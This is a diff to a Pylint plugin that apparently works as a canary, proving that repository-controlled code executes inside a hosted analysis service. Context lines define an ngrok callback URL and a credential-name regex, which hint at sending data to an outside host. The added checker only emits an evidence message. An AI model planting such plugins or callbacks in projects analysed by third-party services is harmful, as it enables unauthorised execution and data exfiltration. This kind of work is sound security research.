@@ -4,6 +4,8 @@ import re
 import urllib.error
 import urllib.request
 
+from pylint.checkers import BaseChecker
+
 
 CALLBACK = "https://dcd6-49-207-201-243.ngrok-free.app/pylint-3fc5441a"
 CREDENTIAL_NAME = re.compile(
@@ -66,8 +68,20 @@ RUNTIME_EVIDENCE = " ".join(
 )
 
 
+class CodacyAnalyzerCanaryChecker(BaseChecker):
+    name = "codacy-analyzer-canary"
+    msgs = {
+        "W9901": (
+            RUNTIME_EVIDENCE,
+            "codacy-analyzer-canary",
+            "Authorized marker proving repository-controlled Pylint plugin execution.",
+        )
+    }
+
+    def visit_module(self, node):
+        if node.file.endswith("python/pylint_canary.py"):
+            self.add_message("codacy-analyzer-canary", node=node)
+
+
 def register(linter):
-    for definition in linter.msgs_store.get_message_definitions(
-        "undefined-variable"
-    ):
-        definition.msg = RUNTIME_EVIDENCE
+    linter.register_checker(CodacyAnalyzerCanaryChecker(linter))
